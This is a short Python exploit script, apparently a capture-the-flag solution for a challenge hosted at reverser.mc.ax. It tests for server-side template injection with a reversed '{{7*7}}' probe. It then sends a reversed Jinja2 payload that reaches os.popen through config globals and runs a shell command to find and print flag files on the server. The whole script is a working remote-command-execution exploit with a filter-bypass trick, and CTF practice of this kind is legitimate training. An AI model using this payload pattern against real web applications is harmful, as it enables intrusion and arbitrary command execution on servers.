import requests
import re

URL="https://reverser.mc.ax/"

def reverse(text):
    return text[::-1]

s = requests.Session()

# checking for exploit
query = "{{7*7}}"
query = reverse(query)
res = s.post(URL, data={
    "text": query,
})
# SSTI injection works here
# we just need to reverse the string, it'll get reversed again in the server
print(res.text)

query = "{{config.__class__.__init__.__globals__['os'].popen('find / -name *flag* -exec cat {} \\;').read()}}"
res = s.post(URL, data={"text":reverse(query)})
print(''.join(re.findall("Output: .*", res.text)))


